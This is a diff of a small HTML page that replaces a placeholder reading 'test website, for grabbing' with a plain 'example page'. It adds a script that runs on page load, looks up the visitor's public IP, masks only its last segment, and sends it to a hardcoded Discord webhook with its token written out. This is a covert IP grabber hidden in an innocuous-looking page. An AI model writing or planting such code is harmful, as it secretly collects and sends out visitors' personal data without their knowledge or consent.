@@ -2,11 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>page</title>
 </head>
 <body>
-    test website, for grabbing, zeta bs would go here
+    <h1>example page</h1>
+
+    <script>
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        console.log('User IP Address:', data.ip);
+        const maskedIp = maskIp(data.ip); // Mask the last 6 digits of the IP address
+        sendIpToWebhook(maskedIp); // Send the masked IP address to webhook
+    });
+
+const maskIp = (ip) => {
+    // Split the IP address into its parts
+    const parts = ip.split('.');
+    // Replace the last segment with 'XXX.XXX'
+    parts[parts.length - 1] = 'XXX'; // Masking the last segment for example; adjust as needed
+    return parts.join('.'); // Rejoin the parts to form the masked IP address
+};
+
+const sendIpToWebhook = (ip) => {
+    fetch('https://discord.com/api/webhooks/1256832093556572192/LmUZIX60c1_soVATzuido5-R0_XCD-p6_JVhNicEM93gZflZ8N_RvyD2HANpKk7aSKn_', {      // Send IP address to Discord webhook
+        method: 'POST',                                  // A webhook protector is used to unblock the webhook
+        headers: {                                       // and prevent abuse
+            'Content-Type': 'application/json'         
+        },
+        body: JSON.stringify({
+            content: ip,
+            username: "Captain Hook"
+        })
+    });
+};
+    </script>
 </body>
 </html>
